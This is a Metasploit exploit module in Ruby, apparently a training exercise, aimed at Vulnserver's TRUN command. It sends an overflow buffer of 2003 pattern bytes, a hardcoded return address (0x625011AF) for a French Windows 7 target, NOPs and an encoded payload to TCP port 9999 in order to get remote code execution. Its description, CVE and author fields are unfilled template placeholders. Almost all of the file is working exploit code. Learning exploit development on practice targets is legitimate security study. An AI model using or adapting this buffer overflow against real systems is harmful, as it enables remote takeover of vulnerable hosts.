##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  #Rank definition: https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking
  #ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'msf_vulnserver',
      'Description'  => %q{
          Provide information about the vulnerability / explain as good as you can
          Make sure to keep each line less than 100 columns wide
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'insert_name_of_person_who_discovered_the_vulnerability<user[at]domain.com>',  # Original discovery
          'Formation',  # MSF Module
        ],
      'References'  =>
        [
          [ 'OSVDB', '<insert OSVDB number here>' ],
          [ 'CVE', 'insert CVE number here' ],
          [ 'URL', '<insert another link to the exploit/advisory here>' ]
        ],
      'DefaultOptions' =>
        {
          'ExitFunction' => 'process', #none/process/thread/seh
          #'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform'  => 'win',
      'Payload'  =>
        {
          'BadChars' => "\x00", # <change if needed>
          'DisableNops' => true,
        },

      'Targets'    =>
        [
          [ 'win7FR',
            {
              'Ret'     =>  0x625011AF,
              'Offset'  =>  2003
            }
          ],
        ],
      'Privileged'  => false,
      #Correct Date Format: "M D Y"
      #Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec
      'DisclosureDate'  => 'MONTH DAY YEAR',
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(9999)], self.class)

  end

  def exploit


    connect
    buffer = "TRUN /.:/"
    buffer << Rex::Text.pattern_create(2003)
    buffer << "\xAF\x11\x50\x62"
    #buffer <<  rand_text(target['Offset'])   
    #buffer << [target.ret].pack('V')   
    buffer << make_nops(20)  
    buffer << payload.encoded
    #print (buffer)
    print_status("Trying target #{target.name}...")
    sock.put(buffer)

    handler
    disconnect

  end
end
